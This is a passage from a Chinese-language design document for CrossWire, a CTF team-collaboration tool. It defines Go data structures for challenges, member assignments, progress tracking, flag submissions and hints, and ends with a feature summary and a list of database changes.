    Category    string    `json:"category" db:"category"`
    Difficulty  string    `json:"difficulty" db:"difficulty"`
    Points      int       `json:"points" db:"points"`
    Description string    `json:"description" db:"description"`
    FlagFormat  string    `json:"flag_format" db:"flag_format"`
    Flag        string    `json:"flag" db:"flag"`
    URL         string    `json:"url" db:"url"`
    Attachments []string  `json:"attachments" db:"attachments"`
    Tags        []string  `json:"tags" db:"tags"`
    Status      string    `json:"status" db:"status"`
    SolvedBy    []string  `json:"solved_by" db:"solved_by"`
    SolvedAt    time.Time `json:"solved_at,omitempty" db:"solved_at"`
    CreatedBy   string    `json:"created_by" db:"created_by"`
    CreatedAt   time.Time `json:"created_at" db:"created_at"`
    UpdatedAt   time.Time `json:"updated_at" db:"updated_at"`
    Metadata    map[string]interface{} `json:"metadata" db:"metadata"`
    
    // 运行时字段
    Assignments []*ChallengeAssignment `json:"assignments,omitempty" db:"-"`
    Progress    []*ChallengeProgress   `json:"progress,omitempty" db:"-"`
}

// ChallengeAssignment 题目分配
type ChallengeAssignment struct {
    ChallengeID string    `json:"challenge_id" db:"challenge_id"`
    MemberID    string    `json:"member_id" db:"member_id"`
    AssignedBy  string    `json:"assigned_by" db:"assigned_by"`
    AssignedAt  time.Time `json:"assigned_at" db:"assigned_at"`
    Role        string    `json:"role" db:"role"`
    Status      string    `json:"status" db:"status"`
    Notes       string    `json:"notes,omitempty" db:"notes"`
    
    // 运行时字段
    Member      *Member   `json:"member,omitempty" db:"-"`
}

// ChallengeProgress 题目进度
type ChallengeProgress struct {
    ID          int       `json:"id" db:"id"`
    ChallengeID string    `json:"challenge_id" db:"challenge_id"`
    MemberID    string    `json:"member_id" db:"member_id"`
    Progress    int       `json:"progress" db:"progress"`
    Status      string    `json:"status" db:"status"`
    Summary     string    `json:"summary,omitempty" db:"summary"`
    Findings    string    `json:"findings,omitempty" db:"findings"`
    Blockers    string    `json:"blockers,omitempty" db:"blockers"`
    UpdatedAt   time.Time `json:"updated_at" db:"updated_at"`
    Metadata    map[string]interface{} `json:"metadata,omitempty" db:"metadata"`
}

// ChallengeSubmission Flag 提交
type ChallengeSubmission struct {
    ID            string    `json:"id" db:"id"`
    ChallengeID   string    `json:"challenge_id" db:"challenge_id"`
    MemberID      string    `json:"member_id" db:"member_id"`
    Flag          string    `json:"-" db:"flag"`  // 不返回给前端
    IsCorrect     bool      `json:"is_correct" db:"is_correct"`
    SubmittedAt   time.Time `json:"submitted_at" db:"submitted_at"`
    IPAddress     string    `json:"ip_address,omitempty" db:"ip_address"`
    ResponseTime  int       `json:"response_time,omitempty" db:"response_time"`
    Metadata      map[string]interface{} `json:"metadata,omitempty" db:"metadata"`
}

// ChallengeHint 题目提示
type ChallengeHint struct {
    ID          string    `json:"id" db:"id"`
    ChallengeID string    `json:"challenge_id" db:"challenge_id"`
    OrderNum    int       `json:"order_num" db:"order_num"`
    Content     string    `json:"content" db:"content"`
    Cost        int       `json:"cost" db:"cost"`
    UnlockedBy  []string  `json:"unlocked_by" db:"unlocked_by"`
    CreatedBy   string    `json:"created_by" db:"created_by"`
    CreatedAt   time.Time `json:"created_at" db:"created_at"`
}
```

---

## 总结

CrossWire 题目管理系统提供了：

✅ **完整的题目生命周期管理**  
✅ **灵活的成员分配机制**  
✅ **独立的题目聊天室**（在同一频道内）  
✅ **实时进度跟踪**  
✅ **Flag 提交验证**  
✅ **提示系统**  
✅ **权限控制**

**数据库新增：**
- 5 个新表
- messages 表增加 2 个字段
- 约 80 个新字段

**适用场景：**
- CTF 线下赛团队协作
- AWD 实时攻防
- 题目分工与进度管理
- 协作解题讨论

---

**相关文档：**
- [DATABASE_TABLES.md](DATABASE_TABLES.md) - 数据库表详细说明
- [DATABASE.md](DATABASE.md) - 数据库主文档
- [FEATURES.md](FEATURES.md) - 功能规格文档
